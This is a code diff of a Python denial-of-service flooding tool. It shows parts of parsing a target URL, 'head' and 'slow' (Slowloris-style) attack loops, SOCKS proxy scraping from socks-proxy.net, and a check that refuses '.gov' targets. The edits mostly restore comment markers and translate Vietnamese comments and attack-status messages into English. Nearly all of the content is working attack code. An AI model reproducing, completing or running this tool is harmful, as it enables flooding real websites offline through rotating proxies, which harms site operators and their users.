@@ -171,27 +171,27 @@ def ParseUrl(original_url):
 	original_url = original_url.strip()
 	url = ""
 	path = "/"#default value
-	port = 80 default value
+	port = 80 #default value
 	protocol = "http"
-	http(s)://www.example.com:1337/xxx
+	#http(s)://www.example.com:1337/xxx
 	if original_url[:7] == "http://":
 		url = original_url[7:]
 	elif original_url[:8] == "https://":
 		url = original_url[8:]
 		protocol = "https"
-	http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
-	print(url) for debug
+	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
+	#print(url) #for debug
 	tmp = url.split("/")
-	website = tmp[0]www.example.com:1337/xxx ==> www.example.com:1337
+	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
 	check = website.split(":")
-	if len(check) != 1:detect the port
+	if len(check) != 1:#detect the port
 		port = int(check[1])
 	else:
 		if protocol == "https":
 			port = 443
 	target = check[0]
 	if len(tmp) > 1:
-		path = url.replace(website,"",1) lấy đường dẫn www.example.com/xxx ==> / xxx
+		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx
 
 def InputOption(question,options,default):
 	ans = ""
@@ -328,7 +328,7 @@ def cc(event,socks_type,ind_rlock):
 		except:
 			s.close()
 
-def head(event,socks_type,ind_rlock): HEAD MODE
+def head(event,socks_type,ind_rlock):#HEAD MODE
 	global ind_dict
 	header = GenReqHeader("head")
 	proxy = Choice(proxies).strip().split(":")
@@ -359,14 +359,14 @@ def head(event,socks_type,ind_rlock): HEAD MODE
 						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
 						ind_rlock.release()
 						proxy = Choice(proxies).strip().split(":")
-						break   Phần này sẽ chuyển sang phần sửa lỗi
+						break#   This part will jump to dirty fix
 				s.close()
 			except:
 				s.close()
 			ind_rlock.acquire()
 			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
 			ind_rlock.release()
-		except: dirty fix
+		except:#dirty fix
 			s.close()
 
 def post(event,socks_type,ind_rlock):
@@ -432,7 +432,7 @@ def slow(conn,socks_type):
 			sys.stdout.flush()
 		except:
 			s.close()
-			proxy = Choice(proxies).strip().split(":") #Chỉ thay đổi proxy khi có lỗi, tăng hiệu suất
+			proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
 			sys.stdout.write("[*] Đang tấn công Slow || Số kết nối: "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 	while True:
@@ -581,7 +581,7 @@ def downloadsocks(choice):
 			f.close()
 		except:
 			f.close()
-		try: credit to All3xJ
+		try:#credit to All3xJ
 			r = requests.get("https://www.socks-proxy.net/")
 			part = str(r.content)
 			part = part.split("<tbody>")
@@ -631,7 +631,7 @@ def downloadsocks(choice):
 		print("> Đã tải xuống danh sách proxy socks5 và lưu thành socks5.txt")
 def prevent():
     if '.gov' in url :
-        print("Bạn không thể tấn công trang web .gov!")
+        print("You can't attack .gov website!")
         exit()
 def main():
 	global multiple
@@ -711,5 +711,6 @@ def main():
 		except KeyboardInterrupt:
 			break
 	
+
 if __name__ == "__main__":
 	main()
